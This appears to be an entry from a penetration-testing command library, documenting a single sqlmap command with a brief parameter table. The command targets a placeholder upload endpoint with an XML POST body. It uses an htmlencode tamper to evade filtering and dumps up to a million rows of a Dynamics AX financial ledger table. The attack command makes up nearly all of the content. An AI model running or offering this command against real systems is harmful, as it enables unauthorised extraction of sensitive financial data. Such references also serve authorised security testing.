---
id: c-sqlmap-dump-table
data: >-
  sqlmap -u "http://target-subdomain.example.com/upload"
  --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dump -T
  LedgerJournalTrans -D dynamics_ax_db --start=1 --stop=1000000
tags:
  - sqli
  - dump
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.265Z'
verified: false
validated: true
submitted: true
---
# sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dump -T LedgerJournalTrans -D dynamics_ax_db --start=1 --stop=1000000

## Command

```bash
sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --tamper=htmlencode --dump -T LedgerJournalTrans -D dynamics_ax_db --start=1 --stop=1000000
```

## Description

Dumps specified table contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--dump` | Extract data | Yes |
| `-T` | Table | Yes |
| `--stop` | Row limit | No |

## Examples

### Basic Usage

```bash
sqlmap ... --dump -T table
```

## Expected Output

Dumped data in file, ~1M rows.

## Related

- [[procedures/Dump-Database-Contents-with-sqlmap]]
